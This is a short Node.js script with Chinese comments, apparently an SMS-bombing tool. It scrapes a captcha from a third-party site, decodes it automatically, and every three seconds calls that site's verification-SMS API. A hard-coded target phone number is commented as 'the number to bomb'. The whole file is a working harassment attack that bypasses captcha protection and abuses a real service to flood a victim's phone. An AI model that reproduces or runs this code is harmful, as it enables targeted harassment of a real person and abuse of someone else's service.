var request = require('superagent');

var cheerio = require('cheerio');

var decode = require('./decode');

var count = 0;

//step1 获取验证码

//step2 解析验证码

//step3 发送请求

var handleYsale = function(){

	var param = new Object();
	param.cookie = "";

	var loadPage = function(){

		request.get("http://app.ysale.cn/jyz5/HTML/result.html").end(function(err,result){
			if(err || !result.ok) result;

			var $ = cheerio.load(result.text);

			var src = $('img[name=vcodepic]').attr('src');				

			decode(param,handleCode);

		});

	}

	var handleCode = function(text){
		
		text = text.trim();

		if(text.length == 4){
			param.vcode = text;
			param.phone = 18345154111;	//需要轰炸的手机号码
			param.act = "recvphone";
			handle();
		}
	}

	var handle = function(){

		var cookie = param.cookie;

		delete(param.cookie);	//移除 cookie 属性

		request.get("http://app.ysale.cn/jyz5/PHP/api.php").set({Cookie:cookie}).query(param).end(function(err,result){
			var v = eval('(' + result.text + ')');
			if(v.msg == 'success'){
				count++;
				console.log("第 " + count + " 次发送: success" );
			}
		})

	}

	return {
		init: function(){
			loadPage();
		}
	}

};

setInterval(handleYsale().init,3000);

